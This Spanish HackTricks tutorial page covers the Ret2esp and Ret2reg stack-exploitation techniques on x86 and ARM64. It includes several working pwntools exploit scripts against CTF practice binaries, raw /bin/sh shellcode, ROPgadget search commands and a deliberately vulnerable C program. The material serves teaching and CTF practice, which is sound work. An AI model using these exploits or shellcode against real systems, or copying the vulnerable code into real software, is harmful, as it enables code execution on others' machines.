# Ret2esp / Ret2reg

{% hint style="success" %}
Aprende y practica Hacking en AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* ¡Consulta los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## **Ret2esp**

**Debido a que el ESP (Puntero de Pila) siempre apunta a la cima de la pila**, esta técnica implica reemplazar el EIP (Puntero de Instrucción) con la dirección de una instrucción **`jmp esp`** o **`call esp`**. Al hacer esto, el shellcode se coloca justo después del EIP sobrescrito. Cuando se ejecuta la instrucción `ret`, ESP apunta a la siguiente dirección, precisamente donde se almacena el shellcode.

Si **la Aleatorización del Espacio de Direcciones (ASLR)** no está habilitada en Windows o Linux, es posible utilizar las instrucciones `jmp esp` o `call esp` encontradas en bibliotecas compartidas. Sin embargo, con [**ASLR**](../common-binary-protections-and-bypasses/aslr/) activo, es posible que sea necesario buscar estas instrucciones dentro del programa vulnerable mismo (y es posible que necesites vencer [**PIE**](../common-binary-protections-and-bypasses/pie/)).

Además, poder colocar el shellcode **después de la corrupción de EIP**, en lugar de en medio de la pila, asegura que cualquier instrucción `push` o `pop` ejecutada durante la operación de la función no interfiera con el shellcode. Esta interferencia podría ocurrir si el shellcode se colocara en medio de la pila de la función.

### Falta de espacio

Si te falta espacio para escribir después de sobrescribir RIP (quizás solo unos pocos bytes), escribe un shellcode **`jmp`** inicial como:
```armasm
sub rsp, 0x30
jmp rsp
```
Y escribe el shellcode al principio de la pila.

### Ejemplo

Puedes encontrar un ejemplo de esta técnica en [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp) con un exploit final como:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = b'A' * 120
payload += p64(jmp_rsp)
payload += asm('''
sub rsp, 10;
jmp rsp;
''')

pause()
p.sendlineafter('RSP!\n', payload)
p.interactive()
```
Puedes ver otro ejemplo de esta técnica en [https://guyinatuxedo.github.io/17-stack\_pivot/xctf16\_b0verflow/index.html](https://guyinatuxedo.github.io/17-stack\_pivot/xctf16\_b0verflow/index.html). Hay un desbordamiento de búfer sin NX habilitado, se utiliza un gadget para **reducir la dirección de `$esp`** y luego un `jmp esp;` para saltar al shellcode:
```python
# From https://guyinatuxedo.github.io/17-stack_pivot/xctf16_b0verflow/index.html
from pwn import *

# Establish the target process
target = process('./b0verflow')
#gdb.attach(target, gdbscript = 'b *0x080485a0')

# The shellcode we will use
# I did not write this, it is from: http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Establish our rop gadgets

# 0x08048504 : jmp esp
jmpEsp = p32(0x08048504)

# 0x080484fd : push ebp ; mov ebp, esp ; sub esp, 0x24 ; ret
pivot = p32(0x80484fd)

# Make the payload

payload = ""
payload += jmpEsp # Our jmp esp gadget
payload += shellcode # Our shellcode
payload += "1"*(0x20 - len(shellcode)) # Filler between end of shellcode and saved return address
payload += pivot # Our pivot gadget

# Send our payload
target.sendline(payload)

# Drop to an interactive shell
target.interactive()
```
## Ret2reg

De manera similar, si sabemos que una función devuelve la dirección donde se almacena el shellcode, podemos aprovechar las instrucciones **`call eax`** o **`jmp eax`** (conocido como técnica **ret2eax**), ofreciendo otro método para ejecutar nuestro shellcode. Al igual que eax, **cualquier otro registro** que contenga una dirección interesante podría ser utilizado (**ret2reg**).

### Ejemplo

Puedes encontrar algunos ejemplos aquí:&#x20;

* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/ret2reg/using-ret2reg)
* [https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/ret2eax.c](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/ASLR%20Smack%20and%20Laugh%20reference%20-%20Tilo%20Mueller/ret2eax.c)
* **`strcpy`** almacenará en **`eax`** la dirección del buffer donde se almacenó el shellcode y **`eax`** no está siendo sobrescrito, por lo que es posible usar un `ret2eax`.

## ARM64

### Ret2sp

En ARM64 no hay instrucciones que permitan **saltar al registro SP**. Podría ser posible encontrar un gadget que **mueva sp a un registro y luego salte a ese registro**, pero en la libc de mi kali no pude encontrar ningún gadget como ese:

{% code overflow="wrap" %}
```bash
for i in `seq 1 30`; do
ROPgadget --binary /usr/lib/aarch64-linux-gnu/libc.so.6 | grep -Ei "[mov|add] x${i}, sp.* ; b[a-z]* x${i}( |$)";
done
```
{% endcode %}

Las únicas que descubrí cambiarían el valor del registro donde se copió sp antes de saltar a él (por lo que se volvería inútil):

<figure><img src="../../.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

### Ret2reg

Si un registro tiene una dirección interesante, es posible saltar a ella simplemente encontrando la instrucción adecuada. Podrías usar algo como:
```bash
ROPgadget --binary /usr/lib/aarch64-linux-gnu/libc.so.6 | grep -Ei " b[a-z]* x[0-9][0-9]?";
```
{% endcode %}

En ARM64, es **`x0`** quien almacena el valor de retorno de una función, por lo que podría ser que x0 almacene la dirección de un búfer controlado por el usuario con un shellcode para ejecutar.

Código de ejemplo:
```c
// clang -o ret2x0 ret2x0.c -no-pie -fno-stack-protector -Wno-format-security -z execstack

#include <stdio.h>
#include <string.h>

void do_stuff(int do_arg){
if (do_arg == 1)
__asm__("br x0");
return;
}

char* vulnerable_function() {
char buffer[64];
fgets(buffer, sizeof(buffer)*3, stdin);
return buffer;
}

int main(int argc, char **argv) {
char* b = vulnerable_function();
do_stuff(2)
return 0;
}
```
Revisando el desensamblado de la función es posible ver que la **dirección del buffer** (vulnerable a bof y **controlado por el usuario**) está **almacenada en `x0`** antes de retornar del desbordamiento de buffer:

<figure><img src="../../.gitbook/assets/image (1225).png" alt="" width="563"><figcaption></figcaption></figure>

También es posible encontrar el gadget **`br x0`** en la función **`do_stuff`**:

<figure><img src="../../.gitbook/assets/image (1226).png" alt="" width="563"><figcaption></figcaption></figure>

Utilizaremos ese gadget para saltar a él porque el binario se compila **SIN PIE.** Usando un patrón es posible ver que el **desplazamiento del desbordamiento de buffer es 80**, por lo que el exploit sería:
```python
from pwn import *

p = process('./ret2x0')
elf = context.binary = ELF('./ret2x0')

stack_offset = 72
shellcode = asm(shellcraft.sh())
br_x0 = p64(0x4006a0) # Addr of: br x0;
payload = shellcode + b"A" * (stack_offset - len(shellcode)) + br_x0

p.sendline(payload)
p.interactive()
```
{% hint style="warning" %}
Si en lugar de `fgets` se hubiera utilizado algo como **`read`**, habría sido posible evadir PIE también solo sobrescribiendo los últimos 2 bytes de la dirección de retorno para regresar a la instrucción `br x0;` sin necesidad de conocer la dirección completa.\
Con `fgets` no funciona porque **añade un byte nulo (0x00) al final**.
{% endhint %}

## Protecciones

* [**NX**](../common-binary-protections-and-bypasses/no-exec-nx.md): Si la pila no es ejecutable, esto no ayudará ya que necesitamos colocar el shellcode en la pila y saltar para ejecutarlo.
* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) & [**PIE**](../common-binary-protections-and-bypasses/pie/): Estas pueden hacer más difícil encontrar una instrucción para saltar a esp u otro registro.

## Referencias

* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode)
* [https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp](https://ir0nstone.gitbook.io/notes/types/stack/reliable-shellcode/using-rsp)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* ¡Consulta los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
